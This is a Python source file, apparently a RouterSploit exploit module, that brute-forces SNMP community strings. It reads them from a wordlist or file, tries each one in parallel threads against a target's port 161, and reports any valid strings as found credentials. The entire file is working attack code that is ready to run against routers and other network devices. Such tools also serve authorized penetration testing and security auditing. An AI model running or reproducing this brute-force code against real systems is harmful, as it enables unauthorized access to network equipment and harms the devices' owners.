import threading
import netsnmp

from routersploit import (
    exploits,
    wordlists,
    print_status,
    print_error,
    LockedIterator,
    print_success,
    print_table,
    boolify,
    multi,
)


class Exploit(exploits.Exploit):
    """
    Module performs bruteforce attack against SNMP service.
    If valid community string is found, it is displayed to the user.
    """
    __info__ = {
        'name': 'SNMP Bruteforce',
        'author': 'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
    }

    target = exploits.Option('', 'Target IP address or file with target:port (file://)')
    port = exploits.Option(161, 'Target port')
    threads = exploits.Option(8, 'Number of threads')
    snmp = exploits.Option(wordlists.snmp, 'Community string or file with community strings (file://)')
    verbosity = exploits.Option('yes', 'Display authentication attempts')

    strings = []

    def run(self):
        self.strings = []
        self.attack()

    @multi
    def attack(self):

        # todo: check if service is up

        if self.snmp.startswith('file://'):
            snmp = open(self.snmp[7:], 'r')
        else:
            snmp = [self.snmp]

        collection = LockedIterator(snmp)
        self.run_threads(self.threads, self.target_function, collection)

        if len(self.strings):
            print_success("Credentials found!")
            headers = ("Target", "Port", "Community Strings")
            print_table(headers, *self.strings)
        else:
            print_error("Valid community strings not found")

    def target_function(self, running, data):
        module_verbosity = boolify(self.verbosity)
        name = threading.current_thread().name
        address = "{}:{}".format(self.target, self.port)

        print_status(name, 'thread is starting...', verbose=module_verbosity)

        while running.is_set():
            try:
                string = data.next().strip()

                bindvariable = netsnmp.Varbind(".1.3.6.1.2.1.1.1.0")
                res = netsnmp.snmpget(bindvariable, Version=1, DestHost=address, Community=string)

                if res[0] is not None:
                    running.clear()
                    print_success("Target: {}:{} {}: Valid community string found - String: '{}'".format(self.target, self.port, name, string), verbose=module_verbosity)
                    self.strings.append((self.target, self.port, string))
                else:
                    print_error("Target: {}:{} {}: Invalid community string - String: '{}'".format(self.target, self.port, name, string), verbose=module_verbosity)

            except StopIteration:
                break

        print_status(name, 'thread is terminated.', verbose=module_verbosity)
